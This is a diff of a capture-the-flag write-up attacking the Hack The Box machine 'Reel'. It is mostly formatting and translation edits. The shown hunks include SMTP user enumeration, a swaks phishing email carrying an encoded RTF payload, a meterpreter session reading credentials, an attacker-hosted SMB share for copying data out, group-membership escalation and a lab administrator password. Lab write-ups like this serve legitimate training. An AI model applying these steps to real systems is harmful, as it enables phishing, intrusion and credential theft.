@@ -13,16 +13,16 @@ Before starting I want to clarify that all my published content is done for educ
 I am not responsible for the misuse they may give you.  
 
 # With this tutorial you will learn:  
-    - How to perform a simple port scan with Nmap.  
-    - How to enumerate the FTP Port  
-    - How to enumerate the SMTP Port  
-    - How to extract metadata from a file with exiftool  
-    - How to perform an attack of Impersonation  
-    - How to do a Phishing with an office file **(.RTF)**  
-    - How to use Metasploit  
-    - How to send emails via SMTP using swaks
-    - How to install and use BloodHound  
-    - Scanning for Active Directory Privileges & Privileged Accounts
+ - How to perform a simple port scan with Nmap.  
+ - How to enumerate the FTP Port  
+ - How to enumerate the SMTP Port  
+ - How to extract metadata from a file with exiftool  
+ - How to perform an attack of Impersonation  
+ - How to do a Phishing with an office file **(.RTF)**  
+ - How to use Metasploit  
+ - How to send emails via SMTP using swaks
+ - How to install and use BloodHound  
+ - Scanning for Active Directory Privileges & Privileged Accounts
 
 # Hacking [Reel](https://www.hackthebox.eu/home/machines/profile/143)  
 
@@ -156,7 +156,7 @@ The file "Windows Event Forwarding.docx" contained the user email address **nico
 ### Extraction of metadata with exiftool  
 ExifTool is a free and open-source software program for reading, writing, and manipulating image, audio, video, and PDF metadata.  
 [Article Complete](https://en.wikipedia.org/wiki/ExifTool)  
-If you want to know how this tool is installed, I invite you to the next [article](https://hackingprofessional.github.io/Security/).  
+If you want to know how this tool is installed, I invite you to the next [article](https://hackingprofessional.github.io/Security/Como-extraer-metadatos-de-un-archivo/).  
 
 {% highlight shell %}
 ╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premium/Reel]─[root@Arthorias]─[0]─[2505]
@@ -267,11 +267,9 @@ Another way to validate this is by using the **smtp-enum-users** tool.
 ╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premium/Reel]─[root@Arthorias]─[0]─[2505]
 ╰─[:)] # smtp-user-enum -M RCPT -U users.txt -t 10.10.10.77
 Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )
-
  ----------------------------------------------------------
 |                   Scan Information                       |
  ----------------------------------------------------------
-
 Mode ..................... RCPT
 Worker Processes ......... 5
 Usernames file ........... users.txt
@@ -280,7 +278,6 @@ Username count ........... 14
 Target TCP port .......... 25
 Query timeout ............ 5 secs
 Target domain ............
-
 ######## Scan started at Mon Jun 14 02:34:42 2019 #########
 10.10.10.77: reel@htb exists
 10.10.10.77: reel@reel.htb exists
@@ -291,7 +288,6 @@ Target domain ............
 10.10.10.77: nico@megabank.com exists
 ######## Scan completed at Mon Jun 14 02:34:42 2019 #########
 8 results.
-
 13 queries in 1 seconds (13.0 queries / sec)
 {% endhighlight %} 
 
@@ -407,8 +403,6 @@ Swaks is a featureful, flexible, scriptable, transaction-oriented SMTP test tool
  -> Y3MwIFxpbnNyc2lkMTk3OTMyNCB9fX19CntcKlxkYXRhc3RvcmUgfQp9Cg==
  -> 
  -> ------=_MIME_BOUNDARY_000_6682--
- -> 
- -> 
  -> .
 <-  250 Queued (11.891 seconds)
  -> QUIT
@@ -438,7 +432,7 @@ Mode              Size  Type  Last modified              Name
 meterpreter > cat cred.xml 
 {% endhighlight %} 
 
-La contenido del archivo es:  
+The content of the file is:   
 
 {% highlight xml %}
 <Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
@@ -496,9 +490,7 @@ In the tom user’s Desktop directory, there was a folder titled **"AD Audit"** 
 
 {% highlight s %}
 C:\users\tom\desktop\AD Audit\BloodHound\Ingestors> dir
-
     Directory: C:\users\tom\desktop\AD Audit\BloodHound\Ingestors
-
 Mode                LastWriteTime     Length Name
 ----                -------------     ------ ----
 -a---        11/16/2017  11:50 PM     112225 acls.csv
@@ -543,7 +535,6 @@ For this we are going to mount an SMB server in our kali to copy our ZIP.
 ┌─[root@BinaryChaos] - [/home/gerh/Escritorio/Prometheus/Ethic4l-Hacking/Operations/Premium/Reel] - [Sun Jun 23, 03:43]
 └─[$]> # impacket-smbserver share ./
 Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation
-
 [*] Config file parsed
 [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
@@ -684,7 +675,9 @@ claire@REEL C:\Users\claire>net group backup_admins
 Group name     Backup_Admins
 Comment
 Members
--------------------------------------------------------------------------------                   ranj                                                                                              The command completed successfully.
+-------------------------------------------------------------------------------
+ranj                
+The command completed successfully.
 
 claire@REEL C:\Users\claire>net group backup_admins claire /add
 The command completed successfully.
@@ -694,7 +687,7 @@ After adding to the "Backup_Admins" group, we can access the **C:\Users\Administ
 Among several of its files, we find a script with access credentials to log in with the Administrator user.  
 
 {% highlight powershell %}
-claire@REEL C:\Users\Administrator\Desktop\Backup Scripts>type BackupScript.ps1              
+claire@REEL C:\Users\Administrator\Desktop\Backup Scripts>type BackupScript.ps1
 # admin password                
 $password="Cr4ckMeIfYouC4n!"
 {% endhighlight %}  
